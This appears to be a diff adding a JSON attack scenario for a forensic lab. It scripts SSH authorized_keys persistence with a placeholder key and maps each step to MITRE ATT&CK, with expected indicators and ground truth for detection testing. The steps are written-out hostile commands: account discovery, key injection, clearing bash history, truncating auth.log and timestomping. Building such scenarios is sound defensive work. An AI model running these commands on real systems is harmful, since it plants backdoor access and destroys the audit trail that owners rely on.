@@ -1,0 +1,158 @@
+{
+  "id": "scenario-ssh-persistence-001",
+  "name": "SSH authorized_keys persistence",
+  "author": "forensic-lab",
+  "mitre": {
+    "tactic_id": "TA0003",
+    "tactic_name": "Persistence",
+    "technique_id": "T1098",
+    "sub_technique_id": "004",
+    "technique_name": "Account Manipulation: SSH Authorized Keys"
+  },
+  "defaults": {
+    "target_user": "ubuntu",
+    "target_home": "/home/ubuntu",
+    "attacker_pubkey": "ssh-ed25519 AAAA_PLACEHOLDER_FORENSICLAB_MARKER forensic-lab-test-key"
+  },
+  "steps": [
+    {
+      "id": "step-recon-shell",
+      "description": "List local users with interactive shells",
+      "command": "getent passwd | awk -F: '$7 ~ /bash|zsh|sh$/ {print $1}'",
+      "phase": "reconnaissance",
+      "mitre": {
+        "tactic_id": "TA0007",
+        "tactic_name": "Discovery",
+        "technique_id": "T1087",
+        "sub_technique_id": "001",
+        "technique_name": "Account Discovery: Local Accounts"
+      },
+      "evasion_levels": ["none", "normal", "high"],
+      "expected_iocs": []
+    },
+    {
+      "id": "step-inject-key",
+      "description": "Append attacker pubkey to authorized_keys",
+      "command": "mkdir -p {{target_home}}/.ssh && echo '{{attacker_pubkey}}' >> {{target_home}}/.ssh/authorized_keys && chmod 700 {{target_home}}/.ssh && chmod 600 {{target_home}}/.ssh/authorized_keys",
+      "phase": "persistence",
+      "mitre": {
+        "tactic_id": "TA0003",
+        "tactic_name": "Persistence",
+        "technique_id": "T1098",
+        "sub_technique_id": "004",
+        "technique_name": "Account Manipulation: SSH Authorized Keys"
+      },
+      "evasion_levels": ["none", "normal", "high"],
+      "expected_iocs": [
+        {
+          "id": "ioc-authorized-keys-file",
+          "type": "file",
+          "attributes": {
+            "path": "{{target_home}}/.ssh/authorized_keys",
+            "content_contains": "forensic-lab-test-key"
+          },
+          "sources": ["sleuthkit_fls", "sleuthkit_istat"]
+        }
+      ]
+    },
+    {
+      "id": "step-evasion-clear-history",
+      "description": "Clear bash history",
+      "command": "export HISTSIZE=0; unset HISTFILE; rm -f ~/.bash_history",
+      "phase": "evasion",
+      "mitre": {
+        "tactic_id": "TA0005",
+        "tactic_name": "Defense Evasion",
+        "technique_id": "T1070",
+        "sub_technique_id": "003",
+        "technique_name": "Indicator Removal: Clear Command History"
+      },
+      "evasion_levels": ["normal", "high"],
+      "expected_iocs": [
+        {
+          "id": "ioc-bash-history-absent",
+          "type": "file",
+          "attributes": {
+            "path": "/root/.bash_history",
+            "exists": false
+          },
+          "sources": ["sleuthkit_fls"]
+        }
+      ]
+    },
+    {
+      "id": "step-evasion-clear-auth-log",
+      "description": "Truncate auth.log to remove SSH connection traces",
+      "command": "truncate -s 0 /var/log/auth.log 2>/dev/null || truncate -s 0 /var/log/secure 2>/dev/null; true",
+      "phase": "evasion",
+      "mitre": {
+        "tactic_id": "TA0005",
+        "tactic_name": "Defense Evasion",
+        "technique_id": "T1070",
+        "sub_technique_id": "002",
+        "technique_name": "Indicator Removal: Clear Linux or Mac System Logs"
+      },
+      "evasion_levels": ["normal", "high"],
+      "expected_iocs": [
+        {
+          "id": "ioc-auth-log-truncated",
+          "type": "file",
+          "attributes": {
+            "path": "/var/log/auth.log",
+            "size_bytes": 0
+          },
+          "sources": ["sleuthkit_istat"]
+        }
+      ]
+    },
+    {
+      "id": "step-evasion-timestomp",
+      "description": "Timestomp authorized_keys to match /etc/passwd mtime",
+      "command": "touch -r /etc/passwd {{target_home}}/.ssh/authorized_keys",
+      "phase": "evasion",
+      "mitre": {
+        "tactic_id": "TA0005",
+        "tactic_name": "Defense Evasion",
+        "technique_id": "T1070",
+        "sub_technique_id": "006",
+        "technique_name": "Indicator Removal: Timestomp"
+      },
+      "evasion_levels": ["high"],
+      "expected_iocs": []
+    }
+  ],
+  "ground_truth": {
+    "iocs": [
+      {
+        "id": "ioc-authorized-keys-file",
+        "type": "file",
+        "attributes": {
+          "path": "{{target_home}}/.ssh/authorized_keys",
+          "content_contains": "forensic-lab-test-key"
+        },
+        "sources": ["sleuthkit_fls", "sleuthkit_istat"],
+        "evasion_note": "File present at all levels. At 'high' level mtime is stomped to match /etc/passwd."
+      },
+      {
+        "id": "ioc-bash-history-absent",
+        "type": "file",
+        "attributes": {
+          "path": "/root/.bash_history",
+          "exists": false
+        },
+        "sources": ["sleuthkit_fls"],
+        "evasion_note": "Only absent at normal and high levels."
+      },
+      {
+        "id": "ioc-auth-log-truncated",
+        "type": "file",
+        "attributes": {
+          "path": "/var/log/auth.log",
+          "size_bytes": 0
+        },
+        "sources": ["sleuthkit_istat"],
+        "evasion_note": "Truncated at normal and high; intact at none."
+      }
+    ]
+  }
+}
